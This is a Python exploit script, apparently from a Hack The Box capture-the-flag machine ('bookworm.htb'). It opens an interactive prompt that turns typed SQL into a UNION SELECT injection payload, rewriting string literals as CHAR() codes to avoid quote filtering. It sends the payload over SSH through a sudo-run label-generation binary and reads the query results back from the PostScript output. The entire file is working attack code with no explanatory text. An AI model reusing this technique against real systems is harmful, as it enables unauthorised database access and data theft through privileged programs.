#!/usr/bin/python3

import os
import re

def replace_strings_with_char(query):
    return re.sub(r"'(.*?)'|\"(.*?)\"", lambda match: f"CHAR({', '.join([str(ord(c)) for c in (match.group(1) or match.group(2))])})", query)

def ssh_cmd(query):
    ssh = 'sshpass ssh neil@bookworm.htb'
    payload = f'0 union select ({query}),2,3,4,5,6,7'
    cmd_out = os.popen(f"{ssh} -C \"sudo /usr/local/bin/genlabel '{payload}'\"").read()
    output = os.popen(f"{ssh} -C \"cat '{cmd_out[-25:].strip()}/output.ps' | sed -n '40p'\"").read()
    return output.replace('show','').strip()[1:-1]

while True:
    try:
        query = input('> ')
        modified_query = replace_strings_with_char(query).replace('"','').replace("'",'')
        output = ssh_cmd(modified_query)
        print(f'{output}\n')
    except KeyboardInterrupt:
        print("\nExiting...")
        break
